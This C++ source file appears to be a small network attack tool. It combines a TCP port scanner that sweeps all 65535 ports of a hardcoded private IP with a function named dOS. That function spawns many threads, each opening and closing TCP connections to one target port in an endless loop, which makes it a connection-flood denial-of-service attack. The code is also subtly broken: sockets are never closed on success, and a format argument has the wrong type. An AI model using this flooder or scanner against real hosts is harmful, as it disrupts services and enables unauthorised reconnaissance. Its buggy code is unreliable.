#include <netdb.h>
#include<stdlib.h>
#include<stdio.h>
#include <cstring>
#include<iostream>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>

bool scanPort(const char  *ip, int port){
    //IPV4 -- TCP -- TCP protocol 
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        return false;
    }

    //Struct 
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    int connection = connect(sock, (struct sockaddr*)&host, sizeof(host));

    if(connection < 0){
        return false;
    }
    else{
        return true;
    }

    close(sock);
}
void scan_all(const char *ip, std::vector<int> ports){
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if(sock < 0 ){

        fprintf(stderr, "Connection refused host: %s  invalid or outside the connection area", *ip  );
    }
    else{
        for(int i = 0; i < ports.size(); i ++ ){
        
            if(scanPort(ip, ports[i]) == true){

                printf("Open port: %i in host: %s \n", ports[i], ip );
            }
            else{
                
                printf("Port: %i in host: %s closed \n", ports[i], ip );
            }

        }
    }
}
void scan_all(const char *ip){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        fprintf(stderr, "Connection refused host: %s  invalid or outside the connection area", *ip  );
        
    }else{
        for(int i = 0; i <= 65535; i ++){
            if(scanPort(ip, i ) ==true ){
                printf("[*] Open port: %i int host: %s \n",i, ip );
            }            
        }
    }
}

void payloadHost(char *buffer, int size){
    struct hostent *hostInfo;
    hostInfo = gethostbyname(buffer);


    // --Translator: binary for string 
    char ipChar[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, hostInfo->h_addr,ipChar, INET_ADDRSTRLEN );
    

    std::string ip(ipChar);
    // making payload
    strncpy(buffer, ip.c_str(), 15);
    buffer[14] = '\0';

}
void infinit_connection ( const char *ip, int port){
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    while(true) { 

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr*)&host, sizeof(host));
        
        close(sock);

        
    }
}
void dOS ( int th, const char *ip, int port ){

   std::vector<std::thread> spiders;

   for(int i = 0; i < th; i ++){
    spiders.emplace_back(infinit_connection, ip, port);
    
   }
   
   for(auto& t : spiders){
        if(t.joinable()){
            t.join();
        }
   }
    
}



int main(){
    char ip [16] = "192.168.5.164";
    
    scan_all( ip);
   

}